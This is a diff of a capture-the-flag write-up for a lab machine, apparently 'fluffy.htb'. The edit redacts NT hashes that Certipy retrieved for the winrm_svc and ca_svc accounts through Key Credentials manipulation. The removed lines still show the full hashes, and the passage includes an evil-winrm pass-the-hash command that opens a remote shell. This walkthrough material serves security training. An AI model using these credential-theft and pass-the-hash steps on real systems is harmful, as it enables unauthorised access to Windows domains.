@@ -466,7 +466,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'winrm_svc'
 [*] Restoring the old Key Credentials for 'winrm_svc'
 [*] Successfully restored the old Key Credentials for 'winrm_svc'
-[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+[*] NT hash for 'winrm_svc': 33bd09d{REEDACTED}f4875767
 ```
 Now we got the Hash for winrm_svc Similarly get the hash for ca_svc in this step only
 Output:
@@ -491,13 +491,13 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'ca_svc'
 [*] Restoring the old Key Credentials for 'ca_svc'
 [*] Successfully restored the old Key Credentials for 'ca_svc'
-[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+[*] NT hash for 'ca_svc': ca0f4f{Redacted}b03fc98c8
 
 ```
 
 Since we have hash for winrm_svc we can use Evil-winrm to get remote shell as winrm_svc
 ```bash
-evil-winrm -i fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
+evil-winrm -i fluffy.htb -u winrm_svc -H '33bd0{REDACTED}75767'
 ```
 
 Output:
